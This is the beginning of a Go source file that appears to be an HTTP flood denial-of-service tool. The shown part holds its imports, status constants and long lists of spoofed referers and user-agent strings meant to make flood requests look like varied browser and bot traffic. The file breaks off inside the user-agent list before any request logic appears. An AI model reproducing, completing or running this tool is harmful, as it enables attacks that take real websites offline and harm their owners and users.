package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__  = "1.0"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
      "http://www.google.com/search?q=",
      "https://check-host.net/",
      "http://anonymouse.org/cgi-bin/anon-www.cgi/",
      "http://coccoc.com/search#query=",
      "https://www.fbi.com/",
      "https://r.search.yahoo.com/",
      "https://www.qwant.com/search?q=",
      "https://www.facebook.com/",
      "http://ddosvn.somee.com/f5.php?v=",
      "http://engadget.search.aol.com/search?q=",
      "http://engadget.search.aol.com/search?q=query?=query=&q=",
      "http://eu.battle.net/wow/en/search?q=",
      "http://filehippo.com/search?q=",
      "https://play.google.com/store/search?q=",
      "http://funnymama.com/search?q=",
      "http://www.bing.com/search?q=",
      "https://www.google.ad/search?q=",
	   "https://www.google.ae/search?q=",
	   "https://www.google.com.af/search?q=",
	   "https://www.google.com.ag/search?q=",
	   "https://www.google.com.ai/search?q=",
	   "https://www.google.al/search?q=",
      "http://duckduckgo.com/?q=",
      "http://search.yahoo.com/search?p=",
      "http://www.usatoday.com/search/results?q=",
      "http://engadget.search.aol.com/search?q=",
      "http://web-sniffer.net/?url=",
      "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
      "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
      "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
      "http://gmodules.com/ig/creator?url=",
      "http://regex.info/exif.cgi?url=",
      "https://drive.google.com/viewerng/viewer?url=",
      //"http://www.google.ru/?hl=ru&q=",
      //"http://yandex.ru/yandsearch?text=",
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
      "SuperBot/4.7.0.74 (Windows XP)1596238052474",
      "Mozilla/4.0 (compatible; SuperCleaner 2.96; Windows NT 6.0)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
      "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-514.2.2.el7.x86_64",
      "Mozilla/4.0 (compatible; SuperCleaner 2.95; Windows NT 5.1)",
      "Mozilla/5.0 (X11; U; Linux x86_64; de-DE; rv:1.9.0.19) Gecko/2010120923 ThumbShotsBot (KFSW 3.0.6-3)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
      "fasthttp5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
      "CCBot/2.0 (https://commoncrawl.org/faq/) [ip:213.32.4.211]",
      "Mozilla/5.0 (compatible; PingAdmin.Ru/1.2; +http://pingadmin.ru/free_test/)",
      "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko (compatible; Zombiebot/2.1; +http://www.zombiedomain.net/robot/)",
      "Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/120.0.6099.43",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
      "Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (Linux; Android 13; SH-52D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; NP807SH Build/S2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.127 Mobile Safari/537.36",
      "Mozilla/5.0 (compatible; URLAppendBot/1.0; +http://www.profound.net/urlappendbot.html)",
      "Mozilla/4.0 (compatible; SuperCleaner 2.96; Windows NT 5.1)",
      "CCBot/2.0 (http://commoncrawl.org/faq/)",
      "http_get",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
   	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
      "fasthttp5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0",
      "Mozilla/5.0 (Linux; Android 13; SH-51B Build/S4037; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.5 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
      "Mozilla/5.0 (Linux; Android 11; KINGKONG MINI2 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36",
      "Mozilla/5.0(Mobile;WindowsPhone8.1;Android4.0;ARM;Trident/7.0;Touch;rv:11.0;IEMobile/11.0;Microsoft;Lumia640LTE)likeiPhoneOS7_0_3MacOSXAppleWebKit/537(KHTML,likeGecko)MobileSafari/537",
      "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "A1 Website Download/11.0.0 (+https://www.microsystools.com/products/website-download/)",
      "Mozilla/5.0 (Debian; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0",
      "Mozilla/5.0 (Kubuntu; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Linux; Android 13; SM-T837A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm; Android 7.0; CUBOT KING KONG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaBrowser/20.11.0.180.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; zh-tw; PHS110 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 HeyTapBrowser/40.9.2.2",
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-N930R4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/97.0.0.18.69;]",
      "Mozilla/5.0 (Linux; Android 9; Samsung Chromebook 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; Samsung Chromebook 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.71 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 1000; 11.8.6; 13PRO)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 1000; 11.9.3; SE2)",
      "Opera/9.80 SonyEricssonU10i/R1QA.2020.12.09 Profile/MIDP-2.1 Configuration/CLDC-1.1 (Opera Mini/1.6.0) Presto/2.5.2",
      "Mozilla/5.0 (Linux; Android 13; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36 EdgA/131.0.2903.87",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0",
      "Mozilla/4.0 (compatible; MSIE 4.0; ) Opera UNTRUSTED/1.0",
      "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
      "Mozilla/5.0 (compatible; Optimizer)",
      "Mozilla/5.0 (compatible; WbSrch/1.2 +https://wbsrch.com)",
      "Mozilla/5.0 (compatible; WbSrch/1.1 +https://wbsrch.com)",
      "Mozilla/5.0 (compatible; WbSrch/1.1 +http://wbsrch.com)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test4; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (Linux; arm; Android 7.0; CUBOT KING KONG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.7.71.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Linux; arm; Android 7.0; CUBOT KING KONG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaBrowser/21.8.5.54.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36 PTST/250202.171658",
      "Mozilla/5.0 (compatible; URLAppendBot/1.0; +http://www.profound.net/urlappendbot.html)",
      "Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.81",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0",
      "fasthttp, Mozilla/5.0 (Macin tosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:127.0) Gecko/20100101 Firefox/127.0",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/101.0.0.0",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.48",
      "Mozilla/5.0 (iPhone; CPU iPhone 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Linux; Android 15; XT2303-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 15; Cubot Hafury V1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339 Safari/534.10",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C50 [FBAN/FBIOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.1;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko MicroAdBot/1.1 (https://www.microad.co.jp/contact/)",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 MicroAdBot/1.1 (https://www.microad.co.jp/contact/)",
      "Mozilla/5.0 (X11; Linux aarch64; Mobile; rv:133.0) Gecko/20100101 Firefox/133.0",
      "Mozilla/5.0 (compatible; Google-Youtube-Links)",
      "Mozilla/5.0 (Linux; Android 14; V2307A Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; SM-T875) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6824.65 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 7.1; GT-I9200 Build/KTU84P) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/51.0.1122.105 Mobile Safari/533.6",
      "Mozilla/5.0 (Linux; Android 8.0.0; HWI-AL00 Build/HUAWEIHWI-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.36 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.0; SMART_Race2_4G Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0; XT1562 Build/MPD24.65-18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0 365",
      "Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+Trident/5.0);+360Spider(compatible;+HaosouSpider;+http://www.haosou.com/help/help_3_2.html)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36; 360Spider",
      "Mozilla/5.0 (Linux; Ubuntu 24.04) AppleWebKit/537.36 Chrome/123.0.6312.86 Safari/537.36",
      "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.15; +http://software.schmorp.de/pkg/AnyEvent)",
      "Mozilla/5.0 (Linux; Ubuntu 24.04) AppleWebKit/537.36 Chrome/87.0.4280.144 Safari/537.36",
      "Mozilla/5.0 (Wayland; Linux x86_64; Huawei) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Ubuntu/24.04 Edg/120.0.2210.133",
      "Mozilla/5.0 (Mobile; U; Windows Phone 11; Android 11.0; ARM; Trident/43.0; Touch; rv:43.0; Edg/99.0.1150.55; NOKIA; 3.1 Plus) like iPhone OS 14_0_3 Mac OS X AppleWebKit/637 (KHTML, like Gecko) Mobile Safari/637",
      "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.127 Large Screen Safari/533.4 GoogleTV/ 162671",
      "Mozilla/5.0 (PlayStation 5 3.03/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)",
      "Mozilla/5.0 (compatible; PiplBot; http://www.pipl.com/bot/)",
      "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.21; +http://software.schmorp.de/pkg/AnyEvent)",
      "Mozilla/5.0 (PlayStation 5/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)",
      "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.23; +http://software.schmorp.de/pkg/AnyEvent)",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.74 Safari/537.36 MRCHROME",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.30 (KHTML, like Gecko) Chrome/26.0.1403.0 Safari/537.30",
      "Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; zh-CN; V2304A Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Quark/7.3.0.650 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; zh-CN; V2304A Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Quark/6.12.0.550 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; V2085A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 VivoBrowser/20.8.0.0",
      "Mozilla/5.0 (Linux; Android 13; V2085A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.74 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 15; V2405A Build/AP3A.240905.015.A1_V000L1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 15; V2405A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.199 YaBrowser/24.12.4.199.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64 Android 15; V2405A Build/AP3A.240905.015.A1_V000L1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 OPX/2.7 Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 13; zh-cn; Xiaomi 12 Lite Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",
      "Mozilla/5.0 (compatible; Butterfly/1.0; +http://labs.topsy.com/butterfly/) Gecko/2009032608 Firefox/3.0.8",
      "Mozilla/5.0 (Macintosh; Butterfly/1.0; +http://labs.topsy.com/butterfly/) Gecko/2009032608 Firefox/3.0.8",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Comodo_Dragon/17.1.0.0 Chrome/17.0.963.38 Safari/535.11",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 TelegramBot (like TwitterBot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 2000; 12.9.3; SE3)",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
      "Mozilla/5.0 (Linux; U; Android 5.1; Lenovo A1010a20 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36 OPR/25.0.2254.116879",
      "Mozilla/5.0 (Linux; Android 12; TECNO BF7 Build/SP1A.210812.016; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 EdgA/124.0.2478",
      "Mozilla/5.0 (Linux; Android 12; TECNO BF7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 15; Pixel 7 Pro Build/AP4A.241205.013; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 EdgA/124.0.2478.64",
      "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro Build/QP1A.190711.020) AppleWebKit/568.41 (KHTML, like Gecko) Firefox/100.0.3445.81 Mobile Safari/568.0",
      "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13; samsung SM-A136U1) Chrome/121.0.6167 Mobile",
      "Mozilla/5.0 (Linux; arm_64; Android 8.0.0; CUBOT_X18_Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.215.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; SM-G887N) AppleWebKit/537.36 (KHTML like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.0.0; SM-A9100) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; RMX3888 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.60 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13; 21121210G Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.99 GoogleApp/16.2.40",
      "Mozilla/5.0 (Linux; Android 14; CPH2415 Build/UKQ1.230924.001; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 EdgA/124.0.2478.64",
      "Mozilla/5.0 (Linux; Android 14; PHK110 Build/UKQ1.231108.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 5.1.1; SM-T365) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 8.0.0; CUBOT_X18_Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.6.2.104.00 SA/1 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.7688.28 Safari/537.36 YaBrowser/132.0.7688.28",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.7688.28 Safari/537.36 YaBrowser/132.0.7688.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.5408.66 Safari/537.36 YaBrowser/132.0.5408.6",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.8778.22 Safari/537.36 YaBrowser/129.0.8778.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.7456.59 Safari/537.36 YaBrowser/131.0.7456.59",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.9384.175 Safari/537.36 YaBrowser/131.0.9384.175",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.3202.180 Safari/537.36 YaBrowser/130.0.3202.18",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.3202.180 Safari/537.36 YaBrowser/130.0.3202.180",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.9488.89 Safari/537.36 YaBrowser/130.0.9488.89",
      "Mozilla/5.0 (Linux; arm_64; Android 10; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaApp_Android/129.0.6668.100 YaSearchBrowser/129.0.6668.100 BroPP/1.0 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.7873.153 Safari/537.36 YaBrowser/129.0.7873.153",
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:80.0) Gecko/20100101 Aq52zRuQ-32 Aq52zRuQ-32 Firefox/125.0",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/125.0",
      "Mozilla/5.0 (Linux; Android 9; SH-M08) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0.1) Gecko/20100101 Firefox/125.0.1",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:125.0.1) Gecko/20100101 Firefox/125.0.1",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
      "Mozilla/5.0 (Linux; arm_64; Android 12; LNA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.327 YaSearchBrowser/24.105 BroPP/1.0 YaSearchApp/24.105 webOmni SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:131.0) Gecko/20100101 Firefox/131.0",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2; rv:131.0) Gecko/20010101 Firefox/131.0",
      "Mozilla/5.0 (Windows NT 11.0; rv:131.0) Gecko/20100101 Firefox/131.0",
